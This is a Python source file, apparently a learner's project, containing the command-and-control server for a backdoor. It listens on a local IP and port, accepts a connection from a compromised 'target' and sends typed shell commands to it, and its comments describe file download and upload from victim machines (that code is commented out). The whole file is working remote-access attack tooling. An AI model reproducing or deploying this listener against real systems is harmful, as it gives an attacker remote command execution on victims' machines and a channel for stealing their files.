##!/usr/bin/python
import os
import socket
import json
# To allow base64 encode() & decode() for files
import base64

# Passing 'data' as arg
def reliable_send(data):
    json_data = json.dumps(data)
    # To allow us sending as much commands & inputs as possible
    target.send(json_data.encode())

def reliable_recv():
    # Preparing to store json_data as bytes
    json_data = b''
    # To allow us run Backdoor until out of bytes
    # Instead of just 1024 bytes
    while True:
        try:
            json_data += target.recv(1024)
            # If target.recv <= 1024 bytes
            return json.loads(json_data.decode())
            
        except ValueError:
            # If we get ValueError
            # Will go over reliable_recv() over & over
            # This will break the contents down to 1024 bytes each time
            continue
    
def shell():
    # Infinite While loop
    while True:
        # Getting outputs from targets
        #message = input("* Shell#~%s: " % str(ip))
        command = input("* Shell#~%s: " % str(ip))
        # type(command) = str
        
        # Sending message.encode() to the target
        #target.send(message.encode())
        #target.send(command.encode())
        reliable_send(command)

        #if message == 'q':
        # Use strip() to remove any leading/trailing whitespace
        if command.strip() == 'q':
            # type(command) = str
            # type(command.strip()) = str
            break
            # continue to s.close()
        
        # For Changing Directory using 'cd' command
        elif command[:2].strip() == 'cd' and len(command.strip()) > 1:
            continue
        # For Downloading files from target machines
        # 'download' command has 8 CHAR
        
            # Wait for the targets to send us back the files
            # Start counting from first 9 CHAR 'download '
            # 'wb' for reading + writing + appending binary files in bytes
            # Socket must use Bytes for packet fragmentation

                # Must use base64 to decode files sent from Backdoor client
                # Backdoor client does the base64 encode part 
                # before sending the files to Backdoor server
                # Backdoor server receives base64 decoded 
                # before creating downloaded file 
                
                               
        # elif command[:8].strip() == 'download':
        #     # type(command[:8].strip()) = str
            
        #     #with open(command[9:].strip(), 'wb') as file:
        #     with open(command[9:], 'wb') as file:
        #         print("Waiting for file data...")
        #         result = reliable_recv()
        #         print("File data received, Decoding...")
        #         result_b64decode = base64.b64decode(result)
        #         print("Decoding complete. Writing to file...")
        #         file.write(result_b64decode)
        #         print("File write complete! :D")
        
        # # 'upload' command
        #     # try: Cuz some files cannot be uploaded/downloaded
        #     # Read from first 7 CHAR as Binary
        #     # fin = fileName
            
        #     # except:
        #         # Avoid hanging the session when
        #         # the file cannot be uploaded/downloaded
        # elif command[:6].strip() == 'upload':
        #     try:
        #         with open(command[7:], 'rb') as fin:
        #         #with open(command[7:].strip(), 'rb') as fin:
        #             fin_read = fin.read()
        #             print(f'type(fin_read): ', type(fin_read))
        #             fin_b64encode = base64.b64encode(fin_read)
        #             reliable_send(fin_b64encode)
        #     except:
        #         failed = 'Failed to Upload'
        #         reliable_send(base64.b64encode(failed))
                
                
        else:
            # target.recv(1024bytes)
            #answer = target.recv(1024)
            #result = target.recv(1024)
            #
            # If receiving packet > 1024 bytes => Backdoor crashes
            # e.g. running netstat -ano will crash this Backdoor
            result = reliable_recv()
            #print(f'answer:\n{answer.decode()}')
            print(f'result:\n{result}')

def server():
    # Scoping
    global s
    global ip
    global target
    # Make a server that listens to IPv4
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Binding to a port
    IP_ADDRESS = '192.168.31.138'
    port = 54321
    print(f'Binding port: {port}...\n')
    s.bind((IP_ADDRESS, port))
    number_of_connections = 5
    print(f'number_of_connections: {number_of_connections}\n')
    s.listen(number_of_connections)
    print(f'Listening for Incoming connections...\n')
    target, ip = s.accept()
    print(f'Target: {target} Connected!\n')

server()
shell()
s.close()